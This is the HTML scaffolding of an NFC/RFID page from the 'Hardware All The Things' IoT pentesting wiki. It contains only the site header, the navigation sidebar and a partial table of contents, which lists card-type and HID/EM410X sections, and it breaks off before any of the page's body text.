
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Hardware/IOT Pentesting Wiki">
      
      
      
        <link rel="canonical" href="https://swisskyrepo.github.io/HardwareAllTheThings/protocols/rfid-nfc/">
      
      
        <link rel="prev" href="../ntag215-amiibo/">
      
      
        <link rel="next" href="../spi/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-9.5.18">
    
    
      
        <title>NFC - RFID - Hardware All The Things</title>
      
    
    
	
      <link rel="stylesheet" href="../../assets/stylesheets/main.66ac8b77.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
  <style>
  .social-container {
    float: right;
  }
  </style>

    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../custom.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
      
        <meta  property="og:type"  content="website" >
      
        <meta  property="og:title"  content="NFC - RFID - Hardware All The Things" >
      
        <meta  property="og:description"  content="Hardware/IOT Pentesting Wiki" >
      
        <meta  property="og:image"  content="https://swisskyrepo.github.io/HardwareAllTheThings/assets/images/social/protocols/rfid-nfc.png" >
      
        <meta  property="og:image:type"  content="image/png" >
      
        <meta  property="og:image:width"  content="1200" >
      
        <meta  property="og:image:height"  content="630" >
      
        <meta  property="og:url"  content="https://swisskyrepo.github.io/HardwareAllTheThings/protocols/rfid-nfc/" >
      
        <meta  name="twitter:card"  content="summary_large_image" >
      
        <meta  name="twitter:title"  content="NFC - RFID - Hardware All The Things" >
      
        <meta  name="twitter:description"  content="Hardware/IOT Pentesting Wiki" >
      
        <meta  name="twitter:image"  content="https://swisskyrepo.github.io/HardwareAllTheThings/assets/images/social/protocols/rfid-nfc.png" >
      
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#nfc-rfid" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Hardware All The Things" class="md-header__button md-logo" aria-label="Hardware All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Hardware All The Things
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              NFC - RFID
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/swisskyrepo/HardwareAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Hardware All The Things" class="md-nav__button md-logo" aria-label="Hardware All The Things" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Hardware All The Things
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/swisskyrepo/HardwareAllTheThings" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    🔌 Hardware All The Things
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Debug interfaces
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Debug interfaces
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../debug-interfaces/jtag/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    JTAG
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../debug-interfaces/swd/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SWD
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../debug-interfaces/uart/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    UART
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Enumeration
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Enumeration
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../enumeration/fcc-id/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    FCC ID
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../enumeration/jtag/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    JTAG
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Firmware
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Firmware
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../firmware/firmware-dumping/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Firmware Dumping
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../firmware/firmware-reverse-engineering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Firmware Reverse Engineering
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Gadgets
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Gadgets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/arduino/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Arduino
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/bruschetta-board/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bruschetta
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/bus-pirate/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bus Pirate
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/ch341a/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CH341A
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/esp32/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ESP32
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/flipper-zero/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Flipper Zero
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/goodfet/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GoodFET
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/hydrabus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HydraBus
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/hydraflash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HydraFlash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/hydranfc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HydraNFC
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/hydrausb3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HydraUSB3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/logic-analyzer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Logic Analyzer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/m5stack/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Evil M5Core2
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/micro-bit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Micro::bit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/proxmark/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Proxmark
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/pwnagotchi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pwnagotchi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gadgets/raspberry-pi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Raspberry Pi
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Other
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Other
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../other/default-iot-passwords/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Default IoT Passwords
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../other/links-and-hardware-kits/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Links & Hardware Kits
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" checked>
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Protocols
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Protocols
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../bluetooth/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bluetooth
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../dnp3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNP3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gps/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GPS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../http/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTTP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../i2c/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    I2C
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../lora/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LoRa
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mms/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MMS (IEC 61850)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../modbus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Modbus
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mqtt/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MQTT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ntag215-amiibo/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NFC - Amiibo
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    NFC - RFID
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    NFC - RFID
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#install-and-configuration" class="md-nav__link">
    <span class="md-ellipsis">
      Install and configuration
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Install and configuration">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#update-and-flash" class="md-nav__link">
    <span class="md-ellipsis">
      Update and flash
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#notes-about-card-types" class="md-nav__link">
    <span class="md-ellipsis">
      Notes about card types
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lf-hid-indala" class="md-nav__link">
    <span class="md-ellipsis">
      LF - HID &amp; Indala
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lf-em410x" class="md-nav__link">
    <span class="md-ellipsis">
      LF - EM410X
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hid-example-card" class="md-nav__link">
    <span class="md-ellipsis">
      HID : Example - Card
    </span>
  </a>
  
    <nav class="md-nav" aria-label="HID : Example - Card">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
